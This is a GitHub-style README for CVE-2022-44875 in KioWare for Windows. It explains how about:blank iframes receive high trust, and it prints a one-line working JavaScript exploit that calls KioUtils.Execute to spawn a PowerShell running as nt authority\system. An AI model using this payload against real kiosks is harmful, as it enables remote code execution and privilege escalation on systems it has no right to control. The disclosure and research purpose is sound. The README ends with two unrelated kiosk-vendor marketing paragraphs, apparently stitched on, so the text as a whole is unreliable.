## [README.md](#readme)

# CVE-2022-44875

## Discovery

Looking through documentation, it can be found that KioWare for Windows has a lot of interesting custom APIs. Specifically the `KioUtils.Execute` that allows for running code as local admin: <https://m.kioware.com/api/windows/8.30/javascript/kioutils>.
These APIs are by default not available, unless a certain "Trust Level" is set in the web context.
The "KioWare Client.exe" binary is .NET, and can therefore trivially be decompiled meaningfully with tools like ILSpy.

Looking through the source and using a debugger, an interesting function can be found:
`ADSI.KioWare.Client.Platform.Client.KioBrowserFrame` has a function called `GetScriptingAclActions` which return `KioScriptingUrlACL.AclActions.AllowHigh` if the URL matches `_alwaysAllowedAclUrlsRegex`.
`ADSI.KioWare.Client.Platform.Client._AppContext` assigns a regex to `_alwaysAllowedAclUrlsRegex` which includes the User-Writable Program Data directory, as well as `about:blank`.
Especially `about:blank` is problematic, as any new iframe without a src attribute uses that as origin. This means that an attacker can write arbitrary js in an iframe that then has the Trust Level "High", which allows for using `KioUtils.Execute`

This would also allow for LPE if one has access to the kiosk as a low privilege user.

## Exploit

```
<script>let c=document.createElement("iframe");document.body.appendChild(c);c.contentWindow.eval("KioUtils.Execute('powershell',true)")</script>
```

If a Kiosk visits a page serving that script, or an XSS is found in a page that is possible to visit a powershell running as `nt authority\system` is spawned.

### Your Kiosk Project

Kiosk projects require staff to be self-service kiosk experts and create and maintain custom kiosk functionality to enable their kiosk application to perform safely and efficiently.

### Staff & Budget

With staff turnover, the self-service kiosk learning curve is steep, forcing kiosk projects to exceed schedule and budget as well as introducing quality assurance uncertainty.
